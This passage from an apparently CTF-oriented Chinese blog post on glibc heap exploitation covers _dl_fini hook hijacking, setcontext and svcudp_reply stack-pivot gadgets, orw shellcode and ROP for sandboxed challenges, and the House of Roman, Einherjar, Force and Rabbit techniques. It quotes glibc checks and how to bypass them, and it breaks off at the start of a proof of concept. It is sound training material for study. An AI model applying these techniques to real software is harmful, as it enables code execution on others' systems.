<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _dl_fini(<span class="type">void</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">        <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">        __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">    ...</span><br><span class="line">    __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">声明位置: libc-lockP.h  </span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"> 替换:  </span><br><span class="line">((&#123;</span><br><span class="line">    __typeof(__pthread_mutex_lock) *_fn = (__pthread_mutex_lock);</span><br><span class="line">    _fn != ((<span class="type">void</span> *) <span class="number">0</span>) ? (*_fn)(&amp;(_dl_load_lock).mutex) : <span class="number">0</span>;</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">声明位置: libc-lockP.h  定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_unlock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"> 替换:  </span><br><span class="line">((&#123;</span><br><span class="line">    __typeof(__pthread_mutex_unlock) *_fn = (__pthread_mutex_unlock);</span><br><span class="line">    _fn != ((<span class="type">void</span> *) <span class="number">0</span>) ? (*_fn)(&amp;(_dl_load_lock).mutex) : <span class="number">0</span>;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/76a1c6eaedfdb13e0435205dceea1ffb.png"
                     
                ><br>只要改写该函数指针就可以在程序结束时劫持程序执行流程。</p>
<p>glibc-2.34 起 <code>__rtld_lock_lock_recursive</code> 和 <code>__rtld_lock_unlock_recursive</code> 定义发生改变，该 hook 失效。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __pthread_mutex_lock (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __pthread_mutex_unlock (&amp;(NAME).mutex)</span></span><br></pre></td></tr></table></figure></div>

<h1 id="mmap-获取-libc-基地址"><a href="#mmap-获取-libc-基地址" class="headerlink" title="mmap 获取 libc 基地址"></a>mmap 获取 libc 基地址</h1><p>当用户的请求超过 mmap 分配阈值，并且主分配区使用 sbrk() 分配失败的时候，或是非主分配区在 top chunk 中不能分配到需要的内存时，ptmalloc 会尝试使用 mmap() 直接映射一块内存到进程内存空间。如果获取到分配的堆块地址，就可以获取一个与 libc 基地址有固定偏移的地址。</p>
<h1 id="setcontext-gadget"><a href="#setcontext-gadget" class="headerlink" title="setcontext gadget"></a>setcontext gadget</h1><p>setcontext函数是libc中一个独特的函数，它的功能是传入一个 SigreturnFrame 结构指针，然后根据 SigreturnFrame 的内容设置各种寄存器。<br>因此从 setcontext+53（不同 libc 偏移可能不同）的位置开始有如下 gadget，即根据 rdi 也就是第一个参数指向的 SigreturnFrame 结构设置寄存器。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000047B75 48 8B A7 A0 00 00 00          mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:0000000000047B7C 48 8B 9F 80 00 00 00          mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000047B83 48 8B 6F 78                   mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000047B87 4C 8B 67 48                   mov     r12, [rdi+48h]</span><br><span class="line">.text:0000000000047B8B 4C 8B 6F 50                   mov     r13, [rdi+50h]</span><br><span class="line">.text:0000000000047B8F 4C 8B 77 58                   mov     r14, [rdi+58h]</span><br><span class="line">.text:0000000000047B93 4C 8B 7F 60                   mov     r15, [rdi+60h]</span><br><span class="line">.text:0000000000047B97 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:0000000000047B9E 51                            push    rcx</span><br><span class="line">.text:0000000000047B9F 48 8B 77 70                   mov     rsi, [rdi+70h]</span><br><span class="line">.text:0000000000047BA3 48 8B 97 88 00 00 00          mov     rdx, [rdi+88h]</span><br><span class="line">.text:0000000000047BAA 48 8B 8F 98 00 00 00          mov     rcx, [rdi+98h]</span><br><span class="line">.text:0000000000047BB1 4C 8B 47 28                   mov     r8, [rdi+28h]</span><br><span class="line">.text:0000000000047BB5 4C 8B 4F 30                   mov     r9, [rdi+30h]</span><br><span class="line">.text:0000000000047BB9 48 8B 7F 68                   mov     rdi, [rdi+68h]</span><br><span class="line">.text:0000000000047BB9                               ; &#125; // starts at 47B40</span><br></pre></td></tr></table></figure></div>

<p>因此只需要设置 rdi 为 SignatureFrame 结构体指针，然后跳转到 <code>setcontext + 53</code> 就可以将<strong>除 rax 外</strong>的寄存器设置成对应的值。</p>
<p>例如 free hook 传入的参数是释放的内存的指针，因此可以通过将 free hook 写入 setcontext gadget 然后 free 一个存储 SigreturnFrame 结构的内存来设置寄存器，继而控制程序执行流程来执行 shellcode 或进一步 rop 。</p>
<p>然而，从 libc-2.29 版本起，setcontext 改用 rdx 寄存器来访问 SigreturnFrame 结构，因此无法直接利用 setcontext 的 gadget 将 free 的 SigreturnFrame 结构赋值给寄存器。<br>不过可以先泄露堆地址，然后通过下面两条 gadget 中的一条将释放的 chunk 的内存地址赋值给 rdx 然后跳转到 setcontext 的 gadget 。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax</span><br><span class="line">mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]</span><br></pre></td></tr></table></figure></div>

<p>除此之外，也可以直接调用 setcontext 函数给寄存器赋值，这就是 house of 一骑当千。</p>
<p>除了 setcontext 外还有另一个 gedget 可以同时完成程序执行流劫持和栈迁移：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;svcudp_reply+22&gt;:	mov    rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;svcudp_reply+26&gt;:	mov    rax,QWORD PTR [rbp+0x18]</span><br><span class="line">&lt;svcudp_reply+30&gt;:	lea    r12,[rbp+0x10]</span><br><span class="line">&lt;svcudp_reply+34&gt;:	mov    DWORD PTR [rbp+0x10],0x0</span><br><span class="line">&lt;svcudp_reply+41&gt;:	mov    rdi,r12</span><br><span class="line">&lt;svcudp_reply+44&gt;:	call   QWORD PTR [rax+0x28]</span><br></pre></td></tr></table></figure></div>

<p>这个 gadget 在不同的 libc 中使用的寄存器不同，具体视情况而定。比如有的 libc 使用的是 rbx 而不是 rbp 导致无法栈迁移实现对程序执行流程的连续劫持。</p>
<p>利用这个gadget，通过<code>rdi</code>控制<code>rbp</code>进而控制<code>rax</code>并执行跳转,只需要在<code>rax + 0x28</code>的位置设置<code>leave; ret</code>即可完成栈迁移.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/b7b00a8ba06c0bda2d24ff50335ff3fa.png"
                     
                ></p>
<h1 id="orw-shellcode"><a href="#orw-shellcode" class="headerlink" title="orw shellcode"></a>orw shellcode</h1><p>对于开了沙箱保护的堆题，由于不能 execve ，需要 orw 的手段来获取 flag 。<br>以这个<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_6d42155be48dfe127bf2d8d9ae68f74a" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>为例，首先在泄露 libc 基地址后通过 house of storm 在 __free_hook 处申请堆块并写入如下数据：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/9f1c3255e77af29d785836b66522068b.png"
                     
                ></p>
<p>之后释放一个 SigreturnFrame，寄存器设置如下图所示。程序通过 setcontext gadget 设置寄存器后将完成栈迁移可程序执行流劫持后程序将执行，此时会调用 mprotect 函数将 __free_hook 所在内存页添加可执行属性并且会将栈迁移至 &amp;__free_hook+0x8 的位置。执行完 mprotect 函数后程序将跳转至 shellcode1 执行。shellcode 会向 __free_hook 所在内存页起始位置读入能 orw 的 shellcode2 并跳转至 shellcode 执行获取 flag 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/d5e7e35deee043c07f38328a13e2124b.png"
                     
                ></p>
<h1 id="与-ROP-结合"><a href="#与-ROP-结合" class="headerlink" title="与 ROP 结合"></a>与 ROP 结合</h1><p>除了写 各种 hook 外，堆利用还可以与 ROP 结合。比如开沙箱禁用 execve 调用的堆题除了前面提到的 orw shellcode 方法外也可以用 orw 的 ROP 来获取 flag。</p>
<h2 id="在栈上构造-ROP"><a href="#在栈上构造-ROP" class="headerlink" title="在栈上构造 ROP"></a>在栈上构造 ROP</h2><p>__environ 是一个保存了栈上变量地址的系统变量，位于 libc 中。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/a16b5ee115e914b5a90fa3c496618017.png"
                     
                ><br>先利用 tcache attack 攻击 <code>__environ</code>  泄露栈地址，然后再利用 tcache 攻击栈上函数的返回地址处，写入 ROP 最后在函数返回控制函数执行流程。</p>
<h2 id="栈迁移至堆"><a href="#栈迁移至堆" class="headerlink" title="栈迁移至堆"></a>栈迁移至堆</h2><p>与 orw shellcode 思路类似，只不过这里只是通过 setcontext rop 将栈迁移至写有 rop 的堆中，利用 rop 来控制程序执行流程。</p>
<h1 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h1><p>通过覆盖 unsorted bin 的 fd 的低 2 字节对 glibc 上某结构进行 1&#x2F;16 概率的爆破。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/69a156f8e0f8b352ec0befa078045689.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><p>House Of Einherjar 主要是利用释放不在 fast bin 大小范围内的 chunk 是会尝试合并前面已释放 chunk 的机制，通过伪造 chunk 头部实现几乎任意地址内存的申请。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/65dd6e231305c31cc6b3f9daa1da18fc.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >

<ul>
<li><p>构造 fake chunk ，因为 fake chunk 涉及 unlink ，</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">    prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    <span class="built_in">unlink</span>(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此要绕过 unlink 的一系列检查（当然如果 fake chunk 用一个已经释放的 chunk 也是可以的）：</p>
<ol>
<li><p>为了绕过</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                 </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure></div>

<p>令：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk-&gt;fd = &amp;fake_chunk</span><br><span class="line">fake_chunk-&gt;bk = &amp;fake_chunk</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>为了绕过（glibc-2.26 起）</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(<span class="built_in">chunksize</span>(P) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(P)), <span class="number">0</span>))   </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);  </span><br></pre></td></tr></table></figure></div>

<p>令：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_prev_size1 = fake_size</span><br></pre></td></tr></table></figure></div></li>
</ol>
</li>
<li><p>溢出修改 chunk2 的 <code>prev_size</code> 为 <code>&amp;chunk2 - &amp;fake_chunk</code> 并将 <code>PREV_INUSE</code> 置 0</p>
</li>
<li><p>free chunk2 ，触发 House Of Einherjar 。</p>
</li>
</ul>
<p>自 glibc-2.29 起加入了 prevsize 的检查，house of einherjar 必须确保 fake chunk 的 fake_size 等于 chunk2 的 fake_prev_size2。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><p>篡改 top chunk 的 size 为一个很大值（通常为 0xFFFFFFFF ）可以绕过对用户请求的大小和 top chunk 现有的 size 进行的验证：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = <span class="built_in">chunksize</span>(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = <span class="built_in">chunk_at_offset</span>(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    <span class="built_in">set_head</span>(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">check_malloced_chunk</span>(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = <span class="built_in">chunk2mem</span>(victim);</span><br><span class="line">    <span class="built_in">alloc_perturb</span>(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果用户请求的堆大小不受限制就可以使得 top chunk 指向我们期望的任何位置。<br>自 glibc2.29 起新增了对 top chunk size 的合法性检查，house of force 就此失效。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h1><p>house of rabbit 有两种攻击方式。</p>
<p>第一种攻击方式是利用 malloc_consolidate 时缺少对 fast bin 中 chunk 的 size 的检查，通过修改 fast bin 中的 chunk 的 size 造成 overlap chunk ,然后触发 malloc_consolidate 使 fastbin 清空，从而分配出重叠的堆块。感觉用处不大，既然能改 size 为什么不先改 size 再释放？</p>
<p>第二种攻击方式是利用 malloc_consolidate 将 fast bin 放入 unsotrted bin 和从 unsorted bin 进 large bin 以及 large bin 切割 chunk 时对 size 检查不严格从而可以不用严格保证 size 正确的情况下将 fake chunk 申请出来，甚至可以任意地址 malloc 。</p>
<p>首先，要想任意地址 malloc 需要让伪造的 chunk 进入 large bin 的最后一个 bin 那么 size 字段至少为 0x80000 。然而 system_mem 初始默认为 0x21000，因此伪造的 chunk 从 unsorted bin 进入 large bin 时会通不过下面的检查：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure></div>

<p>因此需要想办法增大 system_mem 。</p>
<p>其中一种办法是通过申请和释放大内存增大 mmap_threshold 然后 sbrk 增大 system_mem 。</p>
<p>当申请一块大内存时如果 ptmalloc 找不到合适的内存会调用 sysmalloc 函数向系统获取内存。<br>就 main_arena 来说，当调用 sysmalloc 时，ptmalloc 获取内存有直接 mmap 和 brk 扩展 heap 区域两种方式。这两种方式的选择由 mmap_threshold 决定。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br></pre></td></tr></table></figure></div>

<p>只有当所需内存小于 mmap_threshold 时才会调用 brk 扩展内存，system_mem 也才会增加。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (brk != (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (mp_.sbrk_base == <span class="number">0</span>)</span><br><span class="line">      mp_.sbrk_base = brk;</span><br><span class="line">    av-&gt;system_mem += size;</span><br></pre></td></tr></table></figure></div>

<p>因此需要先想办法增大 mmap_threshold 。</p>
<p>当释放一块 ptmalloc 通过 mmap 得到的内存时会将 mmap_threshold 与 chunk 的 size 取最值，因此可以首先通过申请和释放一块大内存将 mmap_threshold 增大。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = chunksize (p);</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">        LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                    mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">      &#125;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>之后再次申请一块大内存来增大 system_mem 。</p>
<p>将 fast bin 中的 chunk 的 fd 指向 fake chunk。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/86470c1200bea0487af12792ac83b64e.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>将 fake chunk 的 size 置1，是为了避免 malloc_consolidate 时与后面的 chunk 合并时 unlink 出错。因为 size 为 1 时查找的下一个地址相邻的 chunk 是自身。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   size = chunksize(p);</span><br><span class="line">   nextchunk = chunk_at_offset(p, size);</span><br><span class="line">   nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">       prevsize = prev_size(p);</span><br><span class="line">       size += prevsize;</span><br><span class="line">       p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">       unlink(av, p, bck, fwd);	<span class="comment">// 不能执行到这里</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);	<span class="comment">// 不能执行到这里</span></span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>

<p>free 一个不在 fast bin 范围的 chunk 与 top chunk 合并，合并后大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 即 0x10000 触发 malloc_consolidate，此时 fake chunk 进入 unsorted bin，而原本在 fast bin 中的 chunk 和释放的 chunk 都合并到 top chunk 中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">     <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br></pre></td></tr></table></figure></div>

<p>为了通过 unsorted bin 到 large bin 时对 size 的检查，同时确保 fake chunk 进入 large bin 的最后一个 bin，需要将 size 的值改为 0x80000 以上。</p>
<p>申请一个大于 0x80000 的内存让 fake chunk 进入 large bin，之后修改 fake chunk 的 size 为一个很大的值（与目标地址的差值再加上一个合适的值，因为第一次 malloc 时会把剩余部分放入 unsorted bin，再次 malloc 会有对 size 的检查）。由于申请内存时从 large bin 的 chunk 切割 chunk 时对 size 缺少检验，因此可以像 house of force 一样任意地址 malloc 。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_rabbit" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> gbuf[<span 